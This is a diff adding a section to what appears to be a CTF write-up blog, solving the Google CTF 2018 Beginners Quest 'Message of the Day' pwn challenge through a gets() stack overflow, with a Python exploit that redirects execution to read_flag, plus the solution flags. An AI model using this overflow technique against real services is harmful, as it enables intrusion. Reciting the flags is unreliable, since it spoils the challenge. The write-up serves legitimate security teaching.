@@ -1813,3 +1813,144 @@ CTF{c0d3ExEc?W411_pL4y3d}
 <br>
 ### Solution
 <b>CTF{c0d3ExEc?W411_pL4y3d}</b>
+
+
+
+<br>
+<br>
+## Message of the Day - pwn
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/82.png" alt="" class="center">
+<br>
+<br>
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/83.png" alt="" class="center">
+
+Prepare your wallets, because Google-Haus bundles all the buzzwords in one single device. Let's check out what the Google assistant has to offer.
+
+```bash
+root@kali:~/google-ctf-2018/message-of-the-day# nc motd.ctfcompetition.com 1337
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: 1
+MOTD: Welcome back friend!
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: 2
+Enter new message of the day
+New msg: Test
+New message of the day saved!
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: 1
+Test
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: 3
+TODO: Allow admin MOTD to be set
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: 4
+You're not root!
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: 
+```
+
+Impressive. So we can set a user MOTD and get a user MOTD, but have no way to read or write the admin MOTD. There was also an attachment on the challenge prompt. Downloading the attachment gives us an ELF file we can run through <code>radare2</code>.
+
+```bash
+root@kali:~/google-ctf-2018/message-of-the-day# r2 motd 
+[0x60606060]> aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
+[0x60606060]> vv
+```
+
+The <b>get_admin_motd</b> and <b>read_flag</b> functions catch the eye. We can see that the functions attempt to open <b>flag.txt</b> and print the contents to console if <code>getuid</code> returns 1.
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/84.png" alt="" class="center">
+<br>
+<br>
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/85.png" alt="" class="center">
+
+We might also notice that the <b>set_motd</b> function calls a C stdio <code>gets</code> function, which has a well known buffer overflow vulnerability.
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/86.png" alt="" class="center">
+
+This particular buffer allocates 100h bytes or 256 bytes for its buffer, or rbp-0x100. If we attempt to write beyond this length, we will be overwriting the return address saved on the stack and whatever parameters are used in the function call. The return address in x86-64 systems is stored at rbp+0x8, so if we can write a modified return address at location rbp+0x108, we can return to whatever function we desire.
+
+Earlier, we saw that in normal program flow, the <b>get_admin_motd</b> function calls <b>read_flag</b> if <code>getuid</code> returns 1. However, if we jump directly to <b>read_flag</b>, we can bypass the <code>getuid</code> check.
+
+So we know the address of the <b>read_flag</b> function is <b>0x606063a5</b>. We need to write this address at rsp+0x108 when setting the message of the day. This means we need to write our address after 0x108h = 264 bytes. 
+
+<b>exploit.py</b>
+```py
+#!/usr/bin/python
+
+import socket
+import telnetlib
+import struct
+
+HOST = "motd.ctfcompetition.com"
+PORT = 1337
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+
+s.sendall("2\n")
+s.sendall("A"*264 + struct.pack("<Q",0x606063a5) + "\n")
+
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
+
+When we run the script above, the program flow returns to <b>read_flag</b>, and the <b>flag.txt</b> file prints to console.
+
+```bash
+root@kali:~/google-ctf-2018/message-of-the-day# python exploit.py 
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: Enter new message of the day
+New msg: New message of the day saved!
+Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
+*** Connection closed by remote host ***
+```
+
+<br>
+<br>
+### Solution
+<b>CTF{m07d_1s_r3t_2_r34d_fl4g}</b>
